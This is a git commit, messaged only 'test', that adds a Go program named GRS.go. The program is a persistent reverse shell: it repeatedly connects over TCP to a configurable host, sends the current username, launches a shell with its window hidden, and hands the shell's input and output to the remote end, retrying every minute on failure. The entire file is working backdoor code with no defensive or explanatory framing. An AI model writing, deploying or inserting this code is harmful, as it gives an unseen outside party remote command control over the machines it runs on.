67e12c2ff8b52c4798d0a63f536408a5e2e8b321
OiseauDesPlages <louca.friess38@gmail.com>
2021-11-04 10:30:01 +0100

    test

---
+++ GRS.go
@@ -0,0 +1,30 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+	"os/user"
+	"syscall"
+	"time"
+)
+
+var host string
+var shellPath string
+
+func main() {
+	for {
+		c, err := net.Dial("tcp", host)
+
+		if err != nil {
+			time.Sleep(time.Minute)
+			continue
+		}
+		user, _ := user.Current()
+		c.Write([]byte(user.Username + "\n"))
+		shell := exec.Command(shellPath)
+		shell.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		shell.Stdout, shell.Stderr, shell.Stdin = c, c, c
+		shell.Run()
+		c.Close()
+	}
+}
